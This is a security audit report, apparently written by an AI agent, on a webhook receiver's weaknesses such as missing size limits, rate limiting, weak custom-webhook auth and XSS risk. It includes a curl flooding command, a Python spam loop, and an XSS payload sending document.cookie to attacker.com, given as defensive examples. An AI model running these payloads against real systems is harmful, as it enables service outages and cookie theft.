# Webhook Security Audit Report

**Date:** 2026-02-22  
**Auditor:** Programmer Agent  
**Scope:** Webhook receiver implementation (task 7f23f1b8)  
**Risk Tier:** A (High - external-facing attack surface)

## Executive Summary

The webhook receiver system was audited for security vulnerabilities. **7 critical/high-risk issues** were identified that create attack surface for DoS, data injection, and information leakage. The signature verification implementation for GitHub/Slack webhooks is solid, but custom webhooks and general input handling need hardening.

**Risk Level:** 🔴 **HIGH** - Requires immediate mitigation before production use

---

## Findings Summary

| # | Issue | Severity | Status |
|---|-------|----------|--------|
| 1 | No payload size limit | 🔴 CRITICAL | ❌ Open |
| 2 | No rate limiting | 🔴 CRITICAL | ❌ Open |
| 3 | Weak authentication for custom webhooks | 🔴 CRITICAL | ❌ Open |
| 4 | No input sanitization (XSS risk) | 🟡 HIGH | ❌ Open |
| 5 | Error messages leak internals | 🟡 HIGH | ❌ Open |
| 6 | No payload schema validation | 🟡 HIGH | ❌ Open |
| 7 | No JSON nesting depth limit | 🟠 MEDIUM | ❌ Open |
| 8 | No event deduplication | 🟠 MEDIUM | ❌ Open |
| 9 | Processing errors exposed in response | 🟠 MEDIUM | ❌ Open |

**Working Correctly:**
- ✅ GitHub/Slack HMAC signature verification
- ✅ Timing-safe signature comparison (`hmac.compare_digest`)
- ✅ Slack replay attack protection (5-minute timestamp window)
- ✅ Management endpoints require Bearer auth
- ✅ SQLAlchemy ORM prevents SQL injection

---

## Detailed Findings

### 🔴 CRITICAL-1: No Payload Size Limit

**Risk:** Denial of Service (DoS)

**Description:**  
The webhook receiver has no maximum payload size enforcement. An attacker can send multi-gigabyte payloads to:
- Exhaust server memory
- Fill disk space (logs, database)
- Cause server crashes or timeouts

**Attack Vector:**
```bash
# Attacker sends 100MB payload
curl -X POST http://server/api/webhooks/receive/custom \
  -H "Content-Type: application/json" \
  -d '{"secret":"leaked-secret","data":"'$(python -c "print('x'*100000000)")'"}
```

**Evidence:**
- No `max_body_size` middleware configured in `app/main.py`
- No Content-Length header validation before reading body
- Test: `test_webhook_rejects_oversized_payload` documents missing control

**Impact:** Server crash, resource exhaustion, service outage

**Recommendation:**
1. Add FastAPI middleware to reject requests > 1MB
2. Validate Content-Length header before reading body
3. Use streaming JSON parser for large payloads (if needed)

---

### 🔴 CRITICAL-2: No Rate Limiting

**Risk:** Denial of Service (DoS), Resource Exhaustion

**Description:**  
No rate limiting on `/api/webhooks/receive/{provider}` endpoint. Attacker with valid signature can:
- Spam thousands of webhooks per second
- Fill database with event records
- Trigger expensive operations (task creation, agent spawning)
- Exhaust CPU/memory/database connections

**Attack Vector:**
```python
# Attacker with leaked secret spams 10,000 webhooks
for i in range(10000):
    requests.post(
        "http://server/api/webhooks/receive/custom",
        json={"secret": "leaked-secret", "title": f"Spam {i}"}
    )
```

**Evidence:**
- No rate limiting middleware (checked for slowapi, RateLimiter, etc.)
- Test: `test_webhook_rate_limiting_per_ip` documents missing control
- Each webhook creates DB records (webhook_events, webhook_deliveries, potentially tasks)

**Impact:** Database growth, performance degradation, cost escalation (if spawning agents)

**Recommendation:**
1. Per-IP rate limit: 10 requests/minute, 100/hour
2. Per-webhook-registration rate limit: 100 requests/hour
3. Consider using slowapi library or custom middleware
4. Add circuit breaker for repeated failures

---

### 🔴 CRITICAL-3: Weak Authentication for Custom Webhooks

**Risk:** Authentication Bypass, Secret Leakage

**Description:**  
Custom webhooks authenticate by including the secret in the JSON payload:
```json
{"secret": "my-secret-key", "title": "Task"}
```

**Problems:**
1. **Secret visible in logs** - Request logging may capture payload
2. **Secret in transit** - Visible in network traffic if HTTPS isn't enforced
3. **No HMAC** - Attacker can modify payload and replay if they intercept one request
4. **Can't rotate secrets** - Changing secret breaks all pending webhooks

**Evidence:**
- Code: `webhooks.py` line ~170: `signature_valid = payload.get("secret") == webhook.secret`
- Test: `test_custom_webhook_weak_authentication` documents the issue

**Impact:** Secret exposure, replay attacks, unauthorized webhook execution

**Recommendation:**
1. **Require HMAC signature** for custom webhooks (like GitHub/Slack)
2. Use `X-Webhook-Signature` header with HMAC-SHA256
3. Document signature generation for custom webhook clients
4. Keep payload-based auth only for backward compatibility (deprecated)

---

### 🟡 HIGH-4: No Input Sanitization (XSS Risk)

**Risk:** Cross-Site Scripting (XSS), Code Injection

**Description:**  
Webhook payloads (titles, descriptions, etc.) are stored in database without sanitization. If rendered in web UI without escaping:
```json
{
  "title": "<script>alert('XSS')</script>",
  "description": "<img src=x onerror=fetch('https://attacker.com?cookie='+document.cookie)>"
}
```

**Evidence:**
- Code: `create_task_from_webhook` stores raw payload data
- Test: `test_webhook_sanitizes_input_for_task_creation` creates task with HTML
- No HTML sanitization library imported (e.g., bleach, html.escape)

**Impact:** XSS attacks if data rendered in browser, potential code injection

**Recommendation:**
1. Add HTML sanitization using `bleach` library
2. Strip/escape all HTML tags in user-controllable fields
3. Use allowlist of safe tags if rich text is needed
4. Validate data types (e.g., numbers, dates) before storage

---

### 🟡 HIGH-5: Error Messages Leak Internal Details

**Risk:** Information Disclosure, Enumeration

**Description:**  
Error responses expose internal implementation details:

**Examples:**
1. **Provider enumeration:**
   - `{"detail": "No webhook configured for provider: github"}` 
   - Reveals which providers are/aren't configured
   
2. **Processing errors:**
   - `{"status": "failed", "error": "KeyError: 'project_id'"}` 
   - Exposes database schema, code paths, variable names

3. **Signature failures:**
   - Different errors for missing webhook (404) vs invalid signature (403)
   - Allows attacker to enumerate configured webhooks

**Evidence:**
- Code: `webhooks.py` returns detailed error messages
- Test: `test_webhook_error_messages_dont_leak_internals` documents the issue

**Impact:** Attacker learns about system internals, aids further attacks

**Recommendation:**
1. Return generic errors: `{"detail": "Webhook processing failed"}`
2. Log detailed errors server-side only
3. Use consistent error codes (always 403 for auth failures)
4. Remove stack traces from production responses

---

### 🟡 HIGH-6: No Payload Schema Validation

**Risk:** Logic Errors, Type Confusion, Crashes

**Description:**  
No Pydantic schema validation for webhook payloads. Any JSON is accepted, causing:
- Unexpected exceptions when accessing missing fields
- Type errors (expecting int, getting string)
- Database errors from malformed data

**Example:**
```json
{
  "action": "opened",
  "issue": {
    "number": "not-a-number",
    "title": null,
    "body": {"nested": "unexpected"}
  }
}
```

**Evidence:**
- Code: Payload parsed as generic `dict`, no validation
- Test: `test_webhook_validates_payload_structure` sends malformed GitHub payload

**Impact:** Server errors, unreliable processing, potential crashes

**Recommendation:**
1. Define Pydantic schemas for each provider's payload
2. Validate schema before processing
3. Return 400 Bad Request for invalid payloads
4. Use `Field()` validators for complex rules

---

### 🟠 MEDIUM-7: No JSON Nesting Depth Limit

**Risk:** Stack Overflow, Memory Exhaustion

**Description:**  
No limit on JSON nesting depth. Deeply nested JSON (1000+ levels) can:
- Cause stack overflow in parser
- Exhaust memory
- Cause slow parsing (DoS)

**Evidence:**
- Test: `test_webhook_rejects_deeply_nested_json` creates 1000-level payload
- No depth limiting in JSON parser configuration

**Impact:** Server crash, memory exhaustion

**Recommendation:**
1. Configure JSON parser max depth (e.g., 10 levels)
2. Or manually validate nesting depth before parsing
3. FastAPI/Starlette may have built-in limits - verify

---

### 🟠 MEDIUM-8: No Event Deduplication

**Risk:** Duplicate Task Creation, Wasted Resources

**Description:**  
Webhook providers (GitHub, etc.) may retry on timeout. Same event can be processed multiple times, creating duplicate tasks/records.

**Evidence:**
- No idempotency key handling
- GitHub sends `X-GitHub-Delivery` header (unique ID) - not checked
- Test: `test_webhook_concurrent_requests_same_signature` documents issue

**Impact:** Duplicate tasks, incorrect metrics, wasted agent work

**Recommendation:**
1. Store `X-GitHub-Delivery` (or provider-specific ID) in webhook_events
2. Add unique constraint on (provider, delivery_id)
3. Return 200 OK for duplicate delivery (idempotent)
4. Implement for all providers with retry logic

---

### 🟠 MEDIUM-9: Processing Errors Exposed in Response

**Risk:** Information Disclosure

**Description:**  
When webhook processing fails, full exception details returned:
```json
{
  "status": "failed",
  "error": "IntegrityError: UNIQUE constraint failed: tasks.id"
}
```

**Evidence:**
- Code: `receive_webhook` catches exceptions and returns `str(e)`
- Test: `test_webhook_processing_errors_dont_expose_details` verifies exposure

**Impact:** Reveals database schema, implementation details

**Recommendation:**
1. Return generic error in response
2. Log full exception server-side
3. Return error ID for support lookup

---

## Security Controls Implemented Correctly

### ✅ GitHub Signature Verification
- Uses HMAC-SHA256 with `hmac.compare_digest` (timing-safe)
- Correctly parses `X-Hub-Signature-256` header
- Code: `verify_github_signature()`

### ✅ Slack Signature Verification  
- Uses HMAC-SHA256 with timestamp for replay protection
- Rejects requests older than 5 minutes
- Code: `verify_slack_signature()`

### ✅ Authentication on Management Endpoints
- All CRUD endpoints have `dependencies=[Depends(require_auth)]`
- Proper separation: receive endpoint uses signature, management uses Bearer

### ✅ SQL Injection Prevention
- SQLAlchemy ORM properly escapes all queries
- No raw SQL with user input
- Test: `test_webhook_prevents_sql_injection_via_payload` validates

---

## Risk Assessment

### Attack Surface
- **External endpoint:** `/api/webhooks/receive/{provider}` - no auth required
- **Accepts arbitrary JSON** from internet (if provider secret leaked)
- **Triggers side effects:** Task creation, database writes, potential agent spawns

### Threat Scenarios

**Scenario 1: DoS Attack**
- Attacker sends 100MB payloads → server crashes ❌
- Attacker spams 10,000 requests/sec → database fills up ❌
- Mitigation: Payload size limit + rate limiting

**Scenario 2: Secret Leakage**
- Custom webhook secret logged in application logs ❌
- Secret intercepted in network traffic (if HTTP used) ❌
- Attacker replays captured request → creates unauthorized tasks ❌
- Mitigation: HMAC signatures, HTTPS enforcement

**Scenario 3: Code Injection**
- Attacker sends XSS payload in task title → executed in browser ⚠️
- Mitigation: HTML sanitization

**Scenario 4: Information Disclosure**
- Attacker enumerates configured webhooks via error messages ⚠️
- Attacker learns database schema from error messages ⚠️
- Mitigation: Generic error messages

---

## Recommendations by Priority

### Immediate (Before Production)
1. ✅ **Add payload size limit** - 1MB max for webhooks
2. ✅ **Add rate limiting** - 10/min per IP, 100/hour per webhook
3. ✅ **Fix custom webhook auth** - Require HMAC signatures
4. ✅ **Sanitize HTML input** - Use bleach library
5. ✅ **Generic error messages** - Don't expose internals

### Short Term (Next Sprint)
6. ⚠️ **Add payload schema validation** - Pydantic models per provider
7. ⚠️ **Event deduplication** - Use delivery IDs
8. ⚠️ **JSON depth limiting** - Max 10 levels

### Medium Term
9. 📋 **Webhook secret rotation** - API for rotating secrets
10. 📋 **Audit logging** - Log all webhook events to audit trail
11. 📋 **Monitoring/alerting** - Alert on high failure rates

---

## Implementation Plan

See `WEBHOOK_SECURITY_FIXES.md` for detailed implementation guidance.

**Testing:**
- All issues documented in `tests/test_webhook_security.py`
- Tests currently pass (documenting missing controls)
- After fixes: Update tests to enforce new controls

**Deployment:**
- Deploy fixes behind feature flag initially
- Monitor for legitimate traffic being blocked
- Full rollout after 48hr observation period

---

## References

- Original task: 7f23f1b8
- Security tests: `tests/test_webhook_security.py`
- Webhook router: `app/routers/webhooks.py`
- Initiative: 24a09d59-400e-4933-90cf-82f717962e7d

**Audit completed:** 2026-02-22  
**Next review:** After security fixes implemented
